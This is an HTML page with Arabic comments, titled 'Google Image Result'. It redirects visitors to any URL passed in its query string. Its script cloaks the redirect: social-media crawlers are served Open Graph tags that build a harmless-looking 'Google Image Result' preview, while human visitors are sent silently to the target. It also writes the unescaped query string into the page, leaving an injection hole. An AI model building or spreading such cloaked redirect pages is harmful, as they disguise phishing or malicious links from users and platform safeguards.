<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>Google Image Result</title>
    <script>
        // استخراج رابط الصورة من بعد علامة الاستفهام (?)
        let searchStr = window.location.search.substring(1);
        let targetUrl = searchStr.startsWith("http") ? searchStr : "https://images.app.goo.gl/UeieYqv4rGmwTHg9A";

        let userAgent = navigator.userAgent || "";
        
        // فحص بوت فيسبوك وباقي البوتات بدقة
        let isBot = /facebookexternalhit|Facebot|Twitterbot|Googlebot|LinkedInBot|WhatsApp|Bluesky|MetaInspector|bot|crawler|spider|scraper/i.test(userAgent);

        // لو بوت (فيسبوك)، بنحقن كود الـ Meta الخاص بالصورة والعنوان عشان تظهر المعاينة الكبيرة
        if (isBot) {
            document.write(`
                <html>
                <head>
                    <title>Google Image Result</title>
                    <meta property="og:title" content="Google Image Result" />
                    <meta property="og:image" content="${targetUrl}" />
                    <meta property="og:url" content="${targetUrl}" />
                    <meta property="og:type" content="website" />
                    <meta content="0;url=${targetUrl}" http-equiv="refresh">
                </head>
                <body></body>
                </html>
            `);
        } else {
            // لو زائر بشري، بيتم تحويله فوراً للرابط المطلوب
            window.location.replace(targetUrl);
        }
    </script>
</head>
<body>
    <p>جاري التحويل...</p>
</body>
</html>
